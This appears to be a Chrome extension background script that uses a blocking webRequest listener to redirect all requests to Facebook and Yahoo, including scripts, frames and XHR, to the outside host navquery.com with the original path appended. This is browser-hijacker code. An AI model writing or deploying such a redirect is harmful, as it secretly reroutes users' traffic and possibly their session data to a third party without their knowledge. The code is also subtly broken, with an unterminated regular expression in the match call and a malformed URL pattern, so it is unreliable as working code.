var host = "https://navquery.com";
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        return {redirectUrl: host + details.url.match(/^https?:\/\/[^\/]+([\S\s]*)[1]};
    },
    {urls: [
        "*://facebook.com/*",
        "*://www.facebook.com/*",
        "*://yahoo.com/*",
        "*//search.yahoo.com/*",
    ],
    types: ["main_frame", "sub_frame", "stylesheet", "script", "image", "object", "xmlhttprequest", "other"]},
    ["blocking"]
);